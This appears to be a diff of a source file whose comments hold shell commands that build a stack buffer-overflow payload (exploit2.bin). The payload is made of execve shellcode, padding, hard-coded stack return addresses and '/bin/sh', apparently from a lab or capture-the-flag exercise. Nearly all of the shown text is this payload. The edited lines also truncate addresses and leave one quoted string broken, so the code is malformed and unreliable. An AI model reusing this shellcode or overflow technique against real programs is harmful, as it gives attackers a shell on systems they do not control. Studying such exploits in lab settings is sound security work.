@@ -87,9 +87,9 @@ Disassembly of section .text:
   
   printf "aa"
   
-  printf "\x38\xd8\xff\xff\xff\x7f\x00\x00"
+  printf "\x38\xd8\xff\xff\xff\x7f\"
   
-  printf "\x58\xd8\xff\xff\xff\x7f\x00\x00"
+  printf "\x58\xd8\xff\xff\xff\x7f\"
   
   printf "/bin/sh\x00"
 ) > exploit2.bin
@@ -97,15 +97,15 @@ Disassembly of section .text:
 */
 
 /*
-alt approach?
+alt approach? - maybe we don't need address on /bin/sh?
 (
   printf "\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05"
   
-  printf "AA"
+  printf "aa"
   
-  printf "\x38\xd8\xff\xff\xff\x7f\x00\x00"
+  printf "\x38\xd8\xff\xff\xff\x7f"
   
-  printf "/bin/sh\x00"
+  printf "/bin/sh"
 ) > exploit2.bin
 
 */
